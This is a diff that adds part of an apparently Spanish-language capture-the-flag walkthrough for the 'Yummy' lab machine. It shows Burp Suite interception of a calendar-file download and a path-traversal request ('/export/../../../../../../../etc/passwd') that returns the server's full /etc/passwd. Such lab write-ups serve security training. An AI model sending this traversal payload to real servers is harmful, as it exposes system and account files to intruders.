@@ -86,3 +86,96 @@ Date Time Start                 : 2025:02:24 00:00:00Z
 Summary                         : test
 UID                             : 74907f64-f16d-4271-a2b8-b8c1c6d6919e@7490.org
 ```
+
+Interceptar la solicitud de descarga del archivo `.ics` con Burpsuite
+
+```
+GET /reminder/21 HTTP/1.1
+Host: yummy.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Referer: http://yummy.htb/dashboard
+Cookie: X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoiY3VzdG9tZXJfNWQ1NjIyZTAiLCJpYXQiOjE3NDA0MzM2NjEsImV4cCI6MTc0MDQzNzI2MSwiandrIjp7Imt0eSI6IlJTQSIsIm4iOiIxMDIwNDczNzM3MDQzMjYwNTc5NjMwODc0OTAwMjI2MDM1NTg5OTcxNTg0Nzc5MDM0ODk2ODcwODI4Nzc4OTQzMzc0OTE5NzM1MjQxMTE0Nzk4MjYwMDg1NTI3MjU0MzcyODEyODM2ODExMDUxMzUzMTkyNTgyMTE1NjkwMjE3NDY5MzM5MDAwNTA1NzY5MzAzMTU0ODcyNDkxMjI2MjY3MzY0MDA1OTc1MjY0MzY4MTY4MjYzMjQyODExNzIyMjA0NDM5MzIzOTkyMTQ3MTAwMTUzOTMxODUxMjQ0MjkyNDY3NTkyNDc1ODk0MDMwODIwNjcyMzA2NzU4NjkyMTUzMTk0NzM2NzU5MDM2NjkwMDk5MzUzNjg0MTcxMjg0MjUxMDYxMjYzOTg4MTAwMzcwNDQ2MTc1MTQwMTEiLCJlIjo2NTUzN319.B79xNddXTA4Wv8nONSm5qLeb9WVGzf-l5oCn7ypf2BYpw07PIlXvP4QOR6dpBRPkBEFnbg4wosEBd4gSSI9PsjBYihGOs5LtTuE6NWdkf3SjMaxM6CTXBdFHn0l74PwXjBn4oSJ6FGsnxK9-5DPNWltfdoU_cZSkTudSoQ_pYqpQbGI
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+```
+
+Click derecho, seleccionar `Do intercept`, `Response to this request`. `Forward`.
+
+```
+GET /export/Yummy_reservation_20250224_220158.ics HTTP/1.1
+Host: yummy.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Referer: http://yummy.htb/dashboard
+Connection: keep-alive
+Cookie: X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoiY3VzdG9tZXJfNWQ1NjIyZTAiLCJpYXQiOjE3NDA0MzM2NjEsImV4cCI6MTc0MDQzNzI2MSwiandrIjp7Imt0eSI6IlJTQSIsIm4iOiIxMDIwNDczNzM3MDQzMjYwNTc5NjMwODc0OTAwMjI2MDM1NTg5OTcxNTg0Nzc5MDM0ODk2ODcwODI4Nzc4OTQzMzc0OTE5NzM1MjQxMTE0Nzk4MjYwMDg1NTI3MjU0MzcyODEyODM2ODExMDUxMzUzMTkyNTgyMTE1NjkwMjE3NDY5MzM5MDAwNTA1NzY5MzAzMTU0ODcyNDkxMjI2MjY3MzY0MDA1OTc1MjY0MzY4MTY4MjYzMjQyODExNzIyMjA0NDM5MzIzOTkyMTQ3MTAwMTUzOTMxODUxMjQ0MjkyNDY3NTkyNDc1ODk0MDMwODIwNjcyMzA2NzU4NjkyMTUzMTk0NzM2NzU5MDM2NjkwMDk5MzUzNjg0MTcxMjg0MjUxMDYxMjYzOTg4MTAwMzcwNDQ2MTc1MTQwMTEiLCJlIjo2NTUzN319.B79xNddXTA4Wv8nONSm5qLeb9WVGzf-l5oCn7ypf2BYpw07PIlXvP4QOR6dpBRPkBEFnbg4wosEBd4gSSI9PsjBYihGOs5LtTuE6NWdkf3SjMaxM6CTXBdFHn0l74PwXjBn4oSJ6FGsnxK9-5DPNWltfdoU_cZSkTudSoQ_pYqpQbGI; session=eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlJlc2VydmF0aW9uIGRvd25sb2FkZWQgc3VjY2Vzc2Z1bGx5Il19XX0.Z7zsVg.eSAfX5kAP-XFZi_QJww4Js6lUWY
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+```
+
+Modificar la ruta `/export/../../../../../../../etc/passwd`. En la primer respuesta del servidor se ve el archivo, si se hace una segunda vez el servidor arroja un error.
+
+```
+HTTP/1.1 200 OK
+Cache-Control: no-cache
+Content-Disposition: attachment; filename=passwd
+Content-Length: 2033
+Content-Type: application/octet-stream
+Date: Mon, 24 Feb 2025 21:59:00 GMT
+Etag: "1727686952.3123646-2033-2190675592"
+Last-Modified: Mon, 30 Sep 2024 09:02:32 GMT
+Server: Caddy
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
+messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
+systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
+pollinate:x:102:1::/var/cache/pollinate:/bin/false
+polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
+syslog:x:103:104::/nonexistent:/usr/sbin/nologin
+uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
+tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
+usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+dev:x:1000:1000:dev:/home/dev:/bin/bash
+mysql:x:110:110:MySQL Server,,,:/nonexistent:/bin/false
+caddy:x:999:988:Caddy web server:/var/lib/caddy:/usr/sbin/nologin
+postfix:x:111:112::/var/spool/postfix:/usr/sbin/nologin
+qa:x:1001:1001::/home/qa:/bin/bash
+_laurel:x:996:987::/var/log/laurel:/bin/false
+```
+
+Caddy config files `/etc/caddy/Caddyfile`
+
+```
+https://caddyserver.com/docs/conventions#your-config-files
+```
+
